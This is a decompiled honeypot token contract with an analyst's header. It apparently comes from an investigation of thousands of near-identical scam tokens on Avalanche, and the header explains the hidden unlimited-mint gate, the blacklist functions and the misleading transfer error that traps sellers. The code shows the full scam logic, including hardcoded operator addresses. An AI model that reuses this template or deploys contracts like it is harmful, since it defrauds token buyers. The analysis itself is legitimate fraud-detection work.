/**
 * =============================================================================
 * PIPELINE TEMPLATE — reference decompile
 * =============================================================================
 *
 * Decompiled runtime bytecode of one canonical avalanche_campaign_2a pipeline
 * contract. All 5,746 campaign_2a contracts (and all sampled campaign_2b
 * contracts) share this exact template — only constructor arguments (token
 * name and symbol) vary between instances.
 *
 * KEY MECHANISMS to look for while reading:
 *
 *   1. `proof(uint256 amount)` — the hidden UNLIMITED MINT gate.
 *      Named to sound like a benign verification call; actually adds
 *      `amount` to _totalSupply and to msg.sender's balance without any cap.
 *      Gated by `require(msg.sender == 0xce54c17...HARDCODED || msg.sender == _owner)`.
 *
 *   2. `Execute(address _uzer)` — the BLACKLIST function.
 *      Adds an address to `mapping_1`. Once added, that address can no longer
 *      transfer the token. Same hardcoded-manager || owner gate.
 *
 *   3. `Approved(address _uzer)` — the UN-BLACKLIST escape valve.
 *      Removes an address from `mapping_1`. Same gate.
 *
 *   4. `_transfer` (compiled as function `0x1216`) — the HONEYPOT TRAP.
 *      Contains `require(!mapping_1[sender], 'Recipient is Gwei');` — the
 *      check reads the SENDER's blacklist status, but the error message
 *      deliberately misdirects to "Recipient". Blacklisted holders see a
 *      confusing error blaming the destination when they try to sell.
 *
 * HARDCODED MANAGER ADDRESSES visible in the require statements below:
 *   - avalanche key #1: 0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac
 *   - avalanche key #2: 0x6b8942200b01b140db3c9053d74216fe3b710f9e
 *     (either key can appear in a given contract's bytecode — the operator
 *     splits the pipeline across two manager keys)
 *
 * KIT ORIGIN: this template is a fork of a publicly-available honeypot
 * kit originally published by security researcher Dev Swanson on 2023-06-05
 * as a scam-education artifact. Sloppy artifacts such as the `_uzer`
 * misspelling and the "Gwei-ed" / "tronglisted" / "Recipient is Gwei"
 * error strings are inherited from Swanson's public code and are NOT
 * fingerprints of this specific operator.
 *
 * =============================================================================
 * Original tool: library.dedaub.com
 * Compiler: solc 0.8.19
 * =============================================================================
 */

contract Decompiled {


    // Data structures and variables inferred from the use of storage instructions
    mapping (address => bool) mapping_1; // STORAGE[0x1]
    mapping (address => uint256) _balanceOf; // STORAGE[0x2]
    mapping (address => mapping (address => uint256)) _allowance; // STORAGE[0x3]
    uint256 _totalSupply; // STORAGE[0x4]
    string _symbol; // STORAGE[0x6]
    string _name; // STORAGE[0x8]
    address _owner; // STORAGE[0x0] bytes 0 to 19
    bool _decimals; // STORAGE[0x5] bytes 0 to 0
    address __user; // STORAGE[0x7] bytes 0 to 19


    // Events
    OwnershipTransferred(address, address);
    Approval(address, address, uint256);
    Transfer(address, address, uint256);

    function 0x1216(uint256 varg0, address varg1, address varg2) private {
        require(!mapping_1[varg2], Error('Recipient is Gwei'));
        require(varg2 - address(0x0), Error('BEP20: transfer from the zero address'));
        require(varg1 - address(0x0), Error('BEP20: transfer to the zero address'));
        v0 = _SafeSub('BEP20: transfer amount exceeds balance', varg0, _balanceOf[varg2]);
        _balanceOf[varg2] = v0;
        v1 = _SafeAdd(varg0, _balanceOf[varg1]);
        _balanceOf[varg1] = v1;
        emit Transfer(varg2, varg1, varg0);
        return ;
    }

    function name() public payable {
        v0 = 0x1a85(_name.length);
        v1 = new bytes[](v0);
        v2 = v3 = v1.data;
        v4 = 0x1a85(_name.length);
        if (v4) {
            if (31 < v4) {
                v5 = v6 = _name.data;
                do {
                    MEM[v2] = STORAGE[v5];
                    v5 += 1;
                    v2 += 32;
                } while (v3 + v4 > v2);
            } else {
                MEM[v3] = _name.length >> 8 << 8;
            }
        }
        v7 = new bytes[](v1.length);
        v8 = v9 = 0;
        while (v8 < v1.length) {
            v7[v8] = v1[v8];
            v8 = v8 + 32;
        }
        v7[v1.length] = 0;
        return v7;
    }

    function approve(address spender, uint256 amount) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 64);
        0xec4(amount, spender, msg.sender);
        return True;
    }

    function _SafeSub(bytes varg0, uint256 varg1, uint256 varg2) private {
        if (varg1 <= varg2) {
            require(varg2 - varg1 <= varg2, Panic(17)); // arithmetic overflow or underflow
            return varg2 - varg1;
        } else {
            v0 = new bytes[](varg0.length);
            v1 = v2 = 0;
            while (v1 < varg0.length) {
                v0[v1] = varg0[v1];
                v1 = v1 + 32;
            }
            v0[varg0.length] = 0;
            revert(Error(v0));
        }
    }

    function _SafeAdd(uint256 varg0, uint256 varg1) private {
        v0 = varg1 + varg0;
        require(varg1 <= v0, Panic(17)); // arithmetic overflow or underflow
        require(v0 >= varg1, Error('SafeMath: addition overflow'));
        return v0;
    }

    function proof(uint256 amount) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 32);
        v0 = v1 = msg.sender == address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac);
        if (msg.sender != address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac)) {
            v0 = v2 = msg.sender == _owner;
        }
        require(v0);
        require(msg.sender - address(0x0), Error('BEP20: mint to the zero address'));
        v3 = _SafeAdd(amount, _totalSupply);
        _totalSupply = v3;
        v4 = _SafeAdd(amount, _balanceOf[msg.sender]);
        _balanceOf[msg.sender] = v4;
        emit Transfer(address(0x0), msg.sender, amount);
        return True;
    }

    function totalSupply() public payable {
        return _totalSupply;
    }

    function 0x1a85(uint256 varg0) private {
        v0 = v1 = varg0 >> 1;
        if (!(varg0 & 0x1)) {
            v0 = v2 = v1 & 0x7f;
        }
        require((varg0 & 0x1) - (v0 < 32), Panic(34)); // access to incorrectly encoded storage byte array
        return v0;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 96);
        0x1216(amount, recipient, sender);
        v0 = _SafeSub('BEP20: transfer amount exceeds allowance', amount, _allowance[sender][msg.sender]);
        0xec4(v0, msg.sender, sender);
        return True;
    }

    function decimals() public payable {
        return _decimals;
    }

    function increaseAllowance(address spender, uint256 addedValue) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 64);
        v0 = _SafeAdd(addedValue, _allowance[msg.sender][spender]);
        0xec4(v0, spender, msg.sender);
        return True;
    }

    function Approved(address _uzer) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 32);
        v0 = v1 = msg.sender == address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac);
        if (msg.sender != address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac)) {
            v0 = v2 = msg.sender == _owner;
        }
        require(v0);
        require(mapping_1[_uzer], Error('user already tronglisted'));
        mapping_1[_uzer] = 0;
    }

    function balanceOf(address account) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 32);
        return _balanceOf[account];
    }

    function renounceOwnership() public payable {
        v0 = v1 = msg.sender == address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac);
        if (msg.sender != address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac)) {
            v0 = v2 = msg.sender == _owner;
        }
        require(v0);
        emit OwnershipTransferred(_owner, address(0x0));
        _owner = 0;
    }

    function _user() public payable {
        return __user;
    }

    function getOwner() public payable {
        return _owner;
    }

    function owner() public payable {
        return _owner;
    }

    function symbol() public payable {
        v0 = 0x1a85(_symbol.length);
        v1 = new bytes[](v0);
        v2 = v3 = v1.data;
        v4 = 0x1a85(_symbol.length);
        if (v4) {
            if (31 < v4) {
                v5 = v6 = _symbol.data;
                do {
                    MEM[v2] = STORAGE[v5];
                    v5 += 1;
                    v2 += 32;
                } while (v3 + v4 > v2);
            } else {
                MEM[v3] = _symbol.length >> 8 << 8;
            }
        }
        v7 = new bytes[](v1.length);
        v8 = v9 = 0;
        while (v8 < v1.length) {
            v7[v8] = v1[v8];
            v8 = v8 + 32;
        }
        v7[v1.length] = 0;
        return v7;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 64);
        v0 = _SafeSub('BEP20: decreased allowance below zero', subtractedValue, _allowance[msg.sender][spender]);
        0xec4(v0, spender, msg.sender);
        return True;
    }

    function transfer(address recipient, uint256 amount) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 64);
        0x1216(amount, recipient, msg.sender);
        return True;
    }

    function allowance(address owner, address spender) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 64);
        return _allowance[owner][spender];
    }

    function transferOwnership(address newOwner) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 32);
        v0 = v1 = msg.sender == address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac);
        if (msg.sender != address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac)) {
            v0 = msg.sender == _owner;
        }
        require(v0);
        require(newOwner - address(0x0), Error('Ownable: new owner is the zero address'));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function Execute(address _bytes_) public payable {
        require(4 + (msg.data.length - 4) - 4 >= 32);
        v0 = v1 = msg.sender == address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac);
        if (msg.sender != address(0xce54c175880ff4edaa5d80b2dc66dda0e34a36ac)) {
            v0 = v2 = msg.sender == _owner;
        }
        require(v0);
        require(!mapping_1[_bytes_], Error('user already Gwei-ed'));
        mapping_1[_bytes_] = 1;
    }

    function fallback() public payable {
        revert();
    }

    function 0xec4(uint256 varg0, address varg1, address varg2) private {
        require(varg2 - address(0x0), Error('BEP20: approve from the zero address'));
        require(varg1 - address(0x0), Error('BEP20: approve to the zero address'));
        _allowance[varg2][varg1] = varg0;
        emit Approval(varg2, varg1, varg0);
        return ;
    }

    // Note: The function selector is not present in the original solidity code.
    // However, we display it for the sake of completeness.

    function __function_selector__( function_selector) public payable {
        MEM[64] = 128;
        require(!msg.value);
        if (msg.data.length < 4) {
            fallback();
        } else if (0x715018a6 > function_selector >> 224) {
            if (0x23b872dd > function_selector >> 224) {
                if (0x6fdde03 == function_selector >> 224) {
                    name();
                } else if (0x95ea7b3 == function_selector >> 224) {
                    approve(address,uint256);
                } else if (0x16e3b09c == function_selector >> 224) {
                    proof(uint256);
                } else {
                    require(0x18160ddd == function_selector >> 224);
                    totalSupply();
                }
            } else if (0x23b872dd == function_selector >> 224) {
                transferFrom(address,address,uint256);
            } else if (0x313ce567 == function_selector >> 224) {
                decimals();
            } else if (0x39509351 == function_selector >> 224) {
                increaseAllowance(address,uint256);
            } else if (0x5d91bd0c == function_selector >> 224) {
                Approved(address);
            } else {
                require(0x70a08231 == function_selector >> 224);
                balanceOf(address);
            }
        } else if (0xa457c2d7 > function_selector >> 224) {
            if (0x715018a6 == function_selector >> 224) {
                renounceOwnership();
            } else if (0x891e1ee0 == function_selector >> 224) {
                _user();
            } else if (0x893d20e8 == function_selector >> 224) {
                getOwner();
            } else if (0x8da5cb5b == function_selector >> 224) {
                owner();
            } else {
                require(0x95d89b41 == function_selector >> 224);
                symbol();
            }
        } else if (0xa457c2d7 == function_selector >> 224) {
            decreaseAllowance(address,uint256);
        } else if (0xa9059cbb == function_selector >> 224) {
            transfer(address,uint256);
        } else if (0xdd62ed3e == function_selector >> 224) {
            allowance(address,address);
        } else if (0xf2fde38b == function_selector >> 224) {
            transferOwnership(address);
        } else {
            require(0xf3294c13 == function_selector >> 224);
            Execute(address);
        }
    }
}
